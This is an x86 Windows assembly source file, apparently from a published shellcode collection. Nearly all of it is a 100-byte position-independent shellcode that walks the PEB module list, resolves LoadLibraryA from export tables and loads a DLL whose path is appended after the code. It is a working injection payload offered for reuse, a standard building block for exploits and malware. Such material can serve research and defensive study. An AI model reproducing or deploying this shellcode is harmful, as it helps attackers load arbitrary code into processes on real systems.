;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;

; 100 byte LoadLibraryA shellcode for x86 windows
; Uses the Export Address Table
; odzhan

      %define X86
      %include "../include.inc"
      
      bits   32
     
      xor    eax, eax
      pushad   
      mov    eax, [fs:eax+TEB.ProcessEnvironmentBlock] 
      mov    eax, [eax+PEB.Ldr]
      mov    edi, [eax+PEB_LDR_DATA.InLoadOrderModuleList + LIST_ENTRY.Flink]
      jmp    scan_dll
next_dll:    
      mov    edi, [edi+LDR_DATA_TABLE_ENTRY.InLoadOrderLinks + LIST_ENTRY.Flink]
scan_dll:
      mov    ebx, [edi+LDR_DATA_TABLE_ENTRY.DllBase]
      test   ebx, ebx
      jz     exit_load
      mov    eax, [ebx+IMAGE_DOS_HEADER.e_lfanew]
      mov    ecx, [ebx+eax+IMAGE_NT_HEADERS.OptionalHeader + \
                           IMAGE_OPTIONAL_HEADER.DataDirectory + \
                           IMAGE_DIRECTORY_ENTRY_EXPORT * IMAGE_DATA_DIRECTORY_size + \
                           IMAGE_DATA_DIRECTORY.VirtualAddress]
      jecxz  next_dll
      lea    esi, [ebx+ecx+IMAGE_EXPORT_DIRECTORY.NumberOfNames]
      lodsd
      xchg   eax, ecx
      jecxz  next_dll                  ; skip if no names
      ; edx = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions     
      lodsd
      xchg   eax, edx
      add    edx, ebx                  ; edx = RVA2VA(edx, ebx)
      ; ebp = IMAGE_EXPORT_DIRECTORY.AddressOfNames
      lodsd
      xchg   eax, ebp
      add    ebp, ebx                  ; ebp = RVA2VA(ebp, ebx)
      ; esi = IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
      lodsd
      xchg   eax, esi
      add    esi, ebx                  ; esi = RVA(esi, ebx)
find_api:
      mov    eax, [ebp+4*ecx-4]        ; eax = RVA of API string
      cmp    dword[eax+ebx], 'Load'
      loopne find_api                  ; --ecx && Load Libr aryA not found
      jecxz  next_dll
      cmp    dword[eax+ebx+8], 'aryA'
      jne    find_api      
      movzx  eax, word [esi+ecx*2]     ; eax = AddressOfNameOrdinals[eax]
      add    ebx, [edx+eax*4]          ; ecx = base + AddressOfFunctions[eax]
      jmp    load_dll
init_dll:
      call   ebx
      mov    [esp + pushad_t._eax], eax
exit_load:
      popad
      ret      
load_dll:
      call   init_dll
      ; dll path goes here      
    